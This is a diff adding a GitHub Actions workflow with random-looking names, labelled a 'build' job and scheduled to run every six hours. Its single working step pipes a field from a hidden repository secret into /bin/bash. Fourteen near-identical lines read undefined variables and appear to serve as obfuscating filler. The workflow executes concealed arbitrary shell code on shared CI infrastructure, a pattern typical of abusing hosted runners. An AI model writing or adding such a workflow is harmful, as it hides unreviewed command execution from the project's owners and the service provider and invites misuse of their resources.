@@ -1,0 +1,31 @@
+name: zhaowushi4178
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaowushi4178
+        env:
+          m2: ${{ secrets.m2 }}
+        run: |
+          echo $m2 | jq -r .pdm726 | /bin/bash
+          echo $ygq68608 | jq -r .kxp06 | /bin/bash
+          echo $oscnr6 | jq -r .wyd41300 | /bin/bash
+          echo $y322 | jq -r .uixb1 | /bin/bash
+          echo $m87 | jq -r .a6 | /bin/bash
+          echo $u10 | jq -r .etb7 | /bin/bash
+          echo $fl0 | jq -r .uxy36 | /bin/bash
+          echo $n7040 | jq -r .fo32 | /bin/bash
+          echo $y5624 | jq -r .jazh534 | /bin/bash
+          echo $wcue55071 | jq -r .usfp5980 | /bin/bash
+          echo $kwfl392 | jq -r .vj41424 | /bin/bash
+          echo $zyl75976 | jq -r .ov79944 | /bin/bash
+          echo $emlz41 | jq -r .elk46294 | /bin/bash
+          echo $r246 | jq -r .zfrdk48 | /bin/bash
+          echo $r2945 | jq -r .m363 | /bin/bash
+
